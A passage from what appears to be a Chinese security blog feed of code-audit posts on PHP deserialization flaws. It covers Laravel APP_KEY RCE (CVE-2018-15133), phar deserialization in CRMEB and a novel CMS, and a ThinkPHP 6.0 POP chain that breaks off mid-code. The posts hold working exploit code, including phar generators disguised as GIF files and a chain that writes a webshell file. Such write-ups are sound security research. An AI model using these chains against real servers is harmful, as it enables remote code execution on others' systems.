<span class="token operator">&amp;&amp;</span>        <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进getTokenFromRequest方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/2.png" alt="" loading="lazy"></p><p>第140行获取头X-XSRF-TOKEN，又来到熟悉的地方了，更新decrypt方法，跟cookie造成的洞是同一个点。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><p>获取APP_KEY，在根目录.env文件里</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/3.png" alt="" loading="lazy"></p><p>用<a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc</a>获取laravel的反序列化的exp</p><pre><code>php phpggc Laravel/RCE1 system &quot;ipconfig&quot; -b</code></pre><p>利用kozmic的poc生成laravel rce的利用代码</p><pre><code>php cve-2018-15133.php yyEsCy8SJCpScYkcEBvrRVHv9MDV43MliNS/4ETRJaw= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjg6ImlwY29uZmlnIjt9</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/4.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/5.png" alt="" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://xz.aliyun.com/t/6533" target="_blank" rel="noopener">https://xz.aliyun.com/t/6533</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;laravel框架APP_KEY泄露的时候，可以通过cookie和X-XSRF-TOKEN触发反序列化漏洞，影响版本：&lt;strong&gt;5.5.x&amp;lt;=5.5.40、5.6.x&amp;lt;=5.6.29&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;环境安装&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>phar反序列化漏洞挖掘</title>
    <link href="http://yoursite.com/2020/07/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>http://yoursite.com/2020/07/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</id>
    <published>2020-07-21T16:00:00.000Z</published>
    <updated>2020-08-17T09:38:05.541Z</updated>
    
    <content type="html"><![CDATA[<h4 id="phar的结构"><a href="#phar的结构" class="headerlink" title="phar的结构"></a><strong>phar的结构</strong></h4><ol><li>a stub是一个文件标志，格式为 ：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>。</li><li>manifest是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。</li><li>contents是被压缩的内容。</li><li><code>signature</code> 签名，放在文件末尾。</li></ol><h4 id="受影响函数"><a href="#受影响函数" class="headerlink" title="受影响函数"></a><strong>受影响函数</strong></h4><table><thead><tr><th align="center">fileatime</th><th align="center">filectime</th><th align="center">file_exists</th><th align="center">file_get_contents</th></tr></thead><tbody><tr><td align="center">file_put_contents</td><td align="center">file</td><td align="center">filegroup</td><td align="center">fopen</td></tr><tr><td align="center">fileinode</td><td align="center">filemtime</td><td align="center">fileowner</td><td align="center">fileperms</td></tr><tr><td align="center">is_dir</td><td align="center">is_executable</td><td align="center">is_file</td><td align="center">is_link</td></tr><tr><td align="center">is_readable</td><td align="center">is_writeable</td><td align="center">parse_ini_file</td><td align="center">copy</td></tr><tr><td align="center">unlink</td><td align="center">stat</td><td align="center">is_writable</td><td align="center">readfile</td></tr></tbody></table><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>phar反序列化可以不用unserialize函数的可控，只需要满足上面的危险函数可控，大大增加了反序列化漏洞的挖掘。这里，利用以下代码生成phar文件：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>phar文件是通过stub来标识的，是通过<code>xxx&lt;?php xxx.__HALT_COMPILER(); ?&gt;</code>来判断的，所以对后缀并没有要求，修改成gif，通过图片的上传点，上传到目标服务器，在利用phar://协议执行pahr文件。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/1.png" alt="" loading="lazy"></p><p>在php.ini中需要设置phar.readonly为off，不是无法生成phar文件</p><pre><code>phar.readonly = off</code></pre><h4 id="CRMEB系统phar反序列化"><a href="#CRMEB系统phar反序列化" class="headerlink" title="CRMEB系统phar反序列化"></a><strong>CRMEB系统phar反序列化</strong></h4><p>CRMEB是基于THINKPHP6.0开发的，tp6.0的反序列化链在前面的文章分析过，利用pop链生成php文件。由于是后台反序列化也只能供学习。在crmeb\app\admin\controller\system\SystemFile.php下的openfile方法中的file参数可控。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/2.png" alt="" loading="lazy"></p><p>第66行将file赋值给了filepath变量，然后跟进67的read_file方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/3.png" alt="" loading="lazy"></p><p>这里$file可控，且存在执行phar反序列化的危险函数，同时这里也可以任意文件读取</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/4.png" alt="" loading="lazy"></p><p>生成phar文件，执行tp6.0反序列化漏洞，exp如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Adapter</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapter</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">"./public/shell.php"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adapter</span> <span class="token operator">=</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Local</span>     <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$writeFlags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//对应file_put_contents的第三个参数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>Local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">(</span><span class="token variable">$local</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将生成的phar文件修改成gif文件，找一处上传gif图片的点，上传这个pahr文件，在添加商品处：admin/store.StoreProduct/create.html</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/5.png" alt="" loading="lazy"></p><p>利用phar协议执行反序列化</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/6.png" alt="" loading="lazy"></p><h4 id="狂雨小说cms-phar反序列化"><a href="#狂雨小说cms-phar反序列化" class="headerlink" title="狂雨小说cms phar反序列化"></a><strong>狂雨小说cms phar反序列化</strong></h4><p>狂雨小说cms最新版是基于tp5.1.33开发的，此漏洞在后台触发。在控制器\application\admin\controller\Ranking.php中的delAllFiles方法，dir参数可控</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/7.png" alt="" loading="lazy"></p><p>利用tp的pop链生成phar文件，exp如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"123456"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Request</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"assert"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"var_ajax"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"visible"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"phpinfo()"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Windows</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>修改后缀为gif，找一处图片上传的点，将phar.gif上传</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/8.png" alt="" loading="lazy"></p><p>最后利用phar协议执行gif文件进行反序列攻击。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/9.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;phar的结构&quot;&gt;&lt;a href=&quot;#phar的结构&quot; class=&quot;headerlink&quot; title=&quot;phar的结构&quot;&gt;&lt;/a&gt;&lt;strong&gt;phar的结构&lt;/strong&gt;&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;a stub是一个文件标志，格式为 ：&lt;code&gt;xx
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP6.0反序列化漏洞分析</title>
    <link href="http://yoursite.com/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-05-13T09:07:31.000Z</published>
    <updated>2020-05-13T09:11:10.699Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>安装tp6.0</p><pre class=" language-shell"><code class="language-shell">composer create-project --prefer-dist topthink/think=6.0.x-dev tp6.0cd tp6.0php think run</code></pre><p>在index控制器中写入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>全局搜索__destruct魔术方法，在\vendor\topthink\think-orm\src\Model.php</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>$this-&gt;lazySave可控，为true的时候，执行save方法，跟进save方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/1.png" alt="" loading="lazy"></p><p>这里要满足两个if语句，$this-&gt;isEmpty()为false，$this-&gt;trigger要不为false，跟进isEmpty方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>$this-&gt;data可控，当存在的时候返回false，继续跟进trigger方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/2.png" alt="" loading="lazy"></p><p>$this-&gt;withEvent可控，当为false时，进入teturn语句，满足if语句，继续看下一行代码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">updateData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insertData</span><span class="token punctuation">(</span><span class="token variable">$sequence</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$this-&gt;exists可控，为true时，跟进updateData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/3.png" alt="" loading="lazy"></p><p>这里要执行到checkAllowFields方法，需要经过2个if语句，第一个if要满足$this-&gt;trigger不为false</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'BeforeUpdate'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>第二个if要满足$data存在，跟进下getChangedData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/4.png" alt="" loading="lazy"></p><p>这里满足$this-&gt;force存在，$this-&gt;data也可控，即2个if语句也绕过了，就可以继续跟进checkAllowFields方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/5.png" alt="" loading="lazy"></p><p>这里发现$this-&gt;table和$this-&gt;suffix进行连接操作，即为字符串，可以触发__toString方法，这里就可以利用ThinkPHP5.2.x那条pop链来构造rce，全局进行搜索__toString方法，跟到\vendor\topthink\think-orm\src\model\concern\Conversion.php文件</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span 